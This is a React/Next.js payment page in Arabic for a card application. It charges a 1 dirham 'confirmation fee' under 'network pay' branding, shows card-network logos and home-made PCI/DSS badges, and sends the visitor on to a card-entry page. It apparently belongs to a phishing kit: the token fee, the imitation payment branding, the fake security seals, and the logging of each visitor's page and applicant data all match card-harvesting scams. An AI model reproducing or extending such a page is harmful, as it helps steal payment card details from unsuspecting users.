"use client";
import { useEffect } from "react";
import { useRouter } from "next/navigation";
import StepBar from "@/components/StepBar";
import { useFormData } from "@/context/FormContext";
import {
  ensureApplicationDoc,
  generateConfirmationCode,
  hasRequiredApplicantData,
} from "@/lib/application-sync";

export default function PaymentPage() {
  const router = useRouter();
  const { data, docId, setDocId, confirmationCode, setConfirmationCode, hydrated } =
    useFormData();

  useEffect(() => {
    if (!hydrated) return;

    if (!hasRequiredApplicantData(data)) {
      router.replace("/register");
      return;
    }

    const code = confirmationCode || generateConfirmationCode();
    if (!confirmationCode) {
      setConfirmationCode(code);
    }

    void ensureApplicationDoc({
      docId,
      data,
      confirmationCode: code,
      pathname: "/payment",
    })
      .then((resolvedId) => {
        if (resolvedId !== docId) {
          setDocId(resolvedId);
        }
      })
      .catch((error) => {
        console.error("Failed to initialize payment application:", error);
      });
  }, [
    confirmationCode,
    data,
    docId,
    hydrated,
    router,
    setConfirmationCode,
    setDocId,
  ]);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center" dir="rtl">
      <div className="w-full max-w-md mx-auto bg-white min-h-screen sm:shadow-xl">
        <StepBar current={2} />
        <div className="px-4 pt-6 pb-10 max-w-sm mx-auto">
          <div className="flex justify-center mb-7">
            <div className="flex items-center gap-1">
              <span className="text-[#1a2b50] font-bold text-3xl tracking-tight">network</span>
              <span className="text-[#e63946] font-bold text-3xl tracking-tight">pay</span>
              <svg width="22" height="22" viewBox="0 0 22 22" fill="none" className="mt-0.5">
                <path d="M5 11l5 5 7-9" stroke="#e63946" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
            </div>
          </div>
          <button className="w-full bg-[#1a2b50] text-white rounded-xl py-4 text-lg font-bold text-center mb-5 shadow">دفع رسوم طلب البطاقة</button>
          <div className="border border-gray-200 rounded-xl overflow-hidden mb-5 bg-white shadow-sm">
            <div className="bg-gray-100 text-center py-2.5 text-sm font-bold text-gray-700 border-b border-gray-200">الرسوم</div>
            <div className="px-4 py-3 space-y-3">
              <div className="flex justify-between items-center"><span className="text-sm font-semibold text-gray-800">1 درهم</span><span className="text-sm text-gray-500">رسوم لتأكيد الطلب</span></div>
              <div className="flex justify-between items-center"><span className="text-sm font-semibold text-gray-800">0 درهم</span><span className="text-sm text-gray-500">رسوم إضافية</span></div>
              <div className="border-t border-gray-200 pt-3 flex justify-between items-center"><span className="text-sm font-bold text-gray-900">1 درهم</span><span className="text-sm font-bold text-gray-900">المجموع</span></div>
            </div>
          </div>
          <div className="border border-gray-200 rounded-xl px-4 py-3 flex items-center justify-between mb-5 bg-white shadow-sm">
            <div className="flex items-center gap-1.5">
              <div className="bg-[#1a1f71] rounded px-1.5 py-0.5"><span className="text-white font-extrabold text-xs italic">VISA</span></div>
              <div className="flex -space-x-1.5"><div className="w-5 h-5 rounded-full bg-[#eb001b]"/><div className="w-5 h-5 rounded-full bg-[#f79e1b] opacity-90"/></div>
              <div className="bg-[#007bc1] rounded px-1 py-0.5"><span className="text-white font-bold text-[9px] leading-none">AMEX</span></div>
              <div className="flex items-center gap-0.5 border border-gray-300 rounded px-1 py-0.5"><div className="w-3 h-3 rounded-full bg-[#00a859]"/><span className="text-[#00a859] font-bold text-[9px]">مدى</span><span className="text-gray-500 font-bold text-[9px]">mada</span></div>
            </div>
            <span className="text-sm text-gray-600 font-medium">الدفع عبر البطاقة</span>
          </div>
          <button onClick={() => router.push("/card")} className="w-full bg-[#1a2b50] text-white rounded-xl py-4 text-lg font-bold flex items-center justify-center gap-2 mb-7 shadow hover:bg-[#243b6a] transition-colors">
            <span className="text-base">›</span>متابعة
          </button>
          <div className="text-center space-y-3">
            <p className="text-xs text-gray-500 leading-relaxed">تُقبل البطاقات العالمية والبطاقات الصادرة في دولة الإمارات العربية المتحدة والخليج.</p>
            <div className="flex items-center justify-center gap-2">
              <span className="text-xs text-gray-400">بياناتك الخاصة آمنة</span>
              <span className="bg-blue-700 text-white text-[9px] font-bold px-1.5 py-0.5 rounded">DSS CERTIFIED</span>
              <span className="bg-blue-500 text-white text-[9px] font-bold px-1.5 py-0.5 rounded">PCI</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
